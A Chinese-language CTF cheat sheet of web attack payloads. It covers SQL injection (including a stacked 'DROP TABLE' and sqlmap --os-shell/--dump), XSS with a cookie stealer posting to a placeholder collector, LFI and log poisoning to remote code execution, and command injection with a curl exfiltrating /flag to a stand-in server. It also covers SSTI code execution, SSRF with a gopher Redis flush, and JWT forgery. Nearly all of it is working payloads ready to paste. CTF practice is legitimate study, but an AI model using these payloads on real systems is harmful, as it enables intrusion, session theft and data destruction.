# CTF Web 常见漏洞速查

## 1. SQL 注入 (SQL Injection)

### 快速识别特征
- URL 参数形如 `?id=1`、`?user=admin`、`?page=2`
- 登录表单存在 username/password 输入
- 报错信息包含数据库关键字（MySQL、PostgreSQL、SQLite、MSSQL）
- 搜索框、排序参数、过滤条件

### 基础探测 Payload
```
' OR '1'='1
" OR "1"="1
' OR 1=1-- -
" OR 1=1-- -
' UNION SELECT null,null-- -
```

### 数据库识别技巧
- MySQL: `SELECT @@version`、报错含 `You have an error in your SQL syntax`
- PostgreSQL: `SELECT version()`、报错含 `ERROR: syntax error at or near`
- SQLite: `SELECT sqlite_version()`、无报错函数，通常轻量级 CTF 使用
- MSSQL: `SELECT @@VERSION`、报错含 `Unclosed quotation mark`

### CTF 常用利用链
1. **登录绕过**: `' OR '1'='1' --` 或 `' OR 1=1 LIMIT 1 --`
2. **UNION 注入**: 先 `ORDER BY n` 确定列数，再 `UNION SELECT 1,2,3`
3. **报错注入**: `EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>'),'/l')`
4. **时间盲注**: `' OR IF(1=1,SLEEP(5),0)--` (MySQL)
5. **堆叠查询**: `; DROP TABLE users; --` (PostgreSQL/MySQL 部分支持)

### SQLMap 高级参数
```bash
sqlmap -u "http://target/page.php?id=1" --batch --level=3 --risk=2 --dump
sqlmap -u "http://target/login" --data="user=1&pass=1" --batch --dump
sqlmap -u "http://target/page.php?id=1" --batch --os-shell
```

---

## 2. 跨站脚本 (XSS)

### 快速识别特征
- 输入点直接反射到页面（搜索框、评论区、URL 参数）
- 存在 bot/admin 模拟访问功能（常见 CTF 提示："管理员会查看报告"）
- Cookie 中有 session 标识且无 HttpOnly

### 基础 Payload
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

### CTF 进阶利用：Cookie 窃取 + Admin Bot
典型场景：题目有 contact/report 功能，admin bot 会访问提交的链接。

```html
<script>
fetch('http://YOUR_COLLECTOR/?c='+document.cookie);
</script>
```

利用链：
1. 在 XSS 页面植入 payload，窃取 admin cookie
2. 用窃取的 cookie 访问 `/admin` 或管理后台
3. 从后台读取 flag 或执行管理员操作

### 绕过技巧
- 事件处理器：`<img src=x onerror=eval(atob('YWxlcnQoMSk='))>`
- 模板注入转 XSS：`{{7*7}}` 在某些框架中可转代码执行
- HTML 实体绕过：`<scr ipt>`、`<script/src=//x.com/a.js>`

---

## 3. 本地文件包含 (LFI) / 路径遍历

### 快速识别特征
- URL 参数形如 `?page=about.php`、`?file=readme.txt`、`?lang=en`
- 包含文件操作功能的页面

### 基础探测
```
?page=../../../etc/passwd
?page=../../../../windows/win.ini
?page=....//....//....//etc/passwd
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### PHP 封装器利用
```
?page=php://filter/read=convert.base64-encode/resource=index.php
?page=php://input  # 配合 POST 数据
?page=data://text/plain,<?php phpinfo();?>
?page=expect://id  # 需要 expect 扩展
```

### 常见敏感文件路径
- Linux: `/etc/passwd`, `/etc/hosts`, `/proc/self/environ`, `/var/log/apache2/access.log`
- Windows: `C:\Windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts`
- PHP: `index.php`, `config.php`, `flag.php`, `class.php`

### Log Poisoning → RCE
1. 先包含 access log：`?page=/var/log/apache2/access.log`
2. 在 User-Agent 中写入 PHP 代码：`<?php system($_GET['cmd']);?>`
3. 再次访问日志文件，执行代码

---

## 4. 远程代码执行 (RCE) / 命令注入

### 快速识别特征
- 功能涉及 ping、nslookup、whois、traceroute
- 文件查看/编辑功能（cat、head、tail）
- 任何将用户输入拼接到系统命令的地方

### 基础探测
```
; id
| id
`id`
$(id)
; cat /flag
| cat /flag
```

### 绕过技巧
- 空格绕过：`${IFS}`、`$IFS$9`、`<`、`<>`
- 黑名单绕过：`c\at /fl\ag`、`/bin/c?t /?lag`
- 编码绕过：`echo Y2F0IC9mbGFn | base64 -d | bash`
- 无回显外带：`; curl http://YOUR_SERVER/$(cat /flag | base64 | tr -d '\n')`

### 常见 CTF Flag 位置
```
/flag
/flag.txt
/flag.php
/home/ctf/flag
/opt/flag
/app/flag
```

---

## 5. 服务器端模板注入 (SSTI)

### 快速识别特征
- 输入被渲染到页面中（如用户资料页显示用户名）
- 框架提示：Flask/Jinja2、Tornado、Django、PHP Smarty
- 测试：`{{7*7}}` 如果返回 `49` 则存在 SSTI

### Jinja2 (Python/Flask) Payload
```
{{config}}
{{self.__init__.__globals__}}
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['system']('id')}}
{{request.application.__globals__['__builtins__']['__import__']('os').popen('cat /flag').read()}}
```

### Tornado (Python) Payload
```
{{ handler.application.settings }}
{{ handler.application.settings['cookie_secret'] }}
```

### PHP Smarty Payload
```
{php}echo id;{/php}
{system('cat /flag')}
```

### 三阶段探测法
1. **探测**: `{{7*7}}`、`${7*7}`、`<%= 7*7 %>`
2. **识别**: `{{config}}` 看返回的对象结构
3. **利用**: 找到可执行类或函数，构造 RCE payload

---

## 6. 反序列化漏洞

### PHP 反序列化
快速识别：代码中出现 `unserialize()`、类定义中有 `__destruct()` / `__wakeup()` / `__toString()`

利用链构造：
1. 找到可利用的类（POP chain）
2. 构造序列化字符串
3. 通过参数传递触发

常用魔术方法：
- `__destruct()`: 对象销毁时自动执行
- `__wakeup()`: `unserialize()` 时自动执行
- `__toString()`: 对象被当作字符串时执行

### Java 反序列化
- 常见 Gadget chain: CommonsCollections、URLDNS
- 特征：数据以 `AC ED` (hex) 开头

---

## 7. 服务端请求伪造 (SSRF)

### 快速识别特征
- 功能涉及 URL 访问（图片加载、Webhook、URL 预览）
- 参数形如 `?url=`、`?target=`、`?feed=`

### 利用场景
```
?url=http://localhost/admin
?url=http://127.0.0.1:8080/flag
?url=file:///etc/passwd
?url=dict://127.0.0.1:6379/info  # Redis
?url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a  # Redis 攻击
```

### 绕过限制
- IP 变形：`0177.0.0.1`、`2130706433`、`0x7f000001`
- DNS 重绑定：`http://make-127.0.0.1-rebind-169-254-169-254.nr-ax.com/`
- URL 编码：`http://127.0.0.1%00.example.com`

---

## 8. JWT / 认证绕过

### JWT 常见攻击
1. **算法混淆 (alg: none)**: 将 header 中 `alg` 改为 `none`，删除签名
2. **弱密钥**: 使用 `jwt_tool` 或 `hashcat` 爆破密钥
3. **RS256 → HS256**: 用公钥作为 HMAC 密钥签名

```bash
jwt_tool.py eyJ0... -C -d wordlist.txt
```

### 会话固定 / Cookie 操纵
- 检查 cookie 是否可预测（如 userid=1, userid=2）
- 尝试修改 role/guest/admin 字段
